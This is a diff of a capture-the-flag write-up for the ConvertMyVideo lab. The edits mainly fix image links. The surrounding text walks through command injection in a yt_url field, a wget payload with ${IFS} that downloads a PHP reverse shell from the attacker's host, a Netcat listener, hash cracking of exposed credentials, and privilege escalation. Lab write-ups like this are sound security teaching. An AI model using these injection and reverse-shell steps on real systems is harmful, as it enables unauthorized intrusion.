@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-convert.png
+![convert.png](../assets/convertmyvideo_assets/convert.png)
 
 ### Enumeration
 
@@ -47,11 +47,11 @@ Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
 
 Heading over to the site we find a page that appears to be a video converter. 
 
-site.png
+![site.png](../assets/convertmyvideo_assets/site.png)
 
 And it appears to error out when anything is entered:
 
-wrong.png
+![wrong.png](../assets/convertmyvideo_assets/wrong.png)
 
 Let's capture this in Burp so we can take a closer look at what is going on here.
 
@@ -59,7 +59,7 @@ Here I entered 'hey!' into the field and captured it in Burp. It looks like it i
 
 Playing around with this field a bit more, I tried entering in `id` into the field and saw that we have code execution here!
 
-id.png
+![id.png](../assets/convertmyvideo_assets/id.png)
 
 Lets try something more malicious with this now. 
 
@@ -67,7 +67,7 @@ Lets try something more malicious with this now.
 
 Lets bring a copy of php-reverse-shell.php to our working directory and update the IP address and Port fields:
 
-php.png
+![php.png](../assets/convertmyvideo_assets/php.png)
 
 We can now set up both a Netcat listener as well as a Python http server. Heading back into Burp we can update the `yt_url` field with: `wget${IFS}http://10.6.61.45/php-reverse-shell.php` (${IFS} is a built in Bash variable standing for Internal Field Separator. This lets us account for the space in the command)
 
@@ -100,7 +100,7 @@ dmv
 
 We can grab the first flag in the `/var/www/html/admin` directory:
 
-user_flag.png
+![user_flag.png](../assets/convertmyvideo_assets/user_flag.png)
 
 Also of interest here are two hidden files. Let's check those out:
 
@@ -116,7 +116,7 @@ itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
 
 Cool, looks like we've found some credentials. Copying the hash back to my attacking machine I can quickly crack it with JohntheRipper:
 
-hash.png
+![hash.png](../assets/convertmyvideo_assets/hash.png)
 
 But it doesn't appear I can use the credential anywhere locally. 
 
@@ -136,9 +136,9 @@ Lets keep poking around.
 ### Privilege Escalation
 
 
-Based on the credential username, I navigated to `/admin` in the browser and found a "Clean Downloads" button. Checking out the source code we find:
+Based on the credential username, I navigated to `/admin` in the browser and logged in with the discovered credentials. There I found a "Clean Downloads" button. Checking out the source code we find:
 
-clear.png
+![clear.png](../assets/convertmyvideo_assets/clear.png)
 
 Interesting, lets check that out in the shell we have. 
 
@@ -176,7 +176,7 @@ dmv
 
 Lets grab that last flag:
 
-root_flag.png
+![root_flag.png](../assets/convertmyvideo_assets/root_flag.png)
 
 Thanks for following along!
 
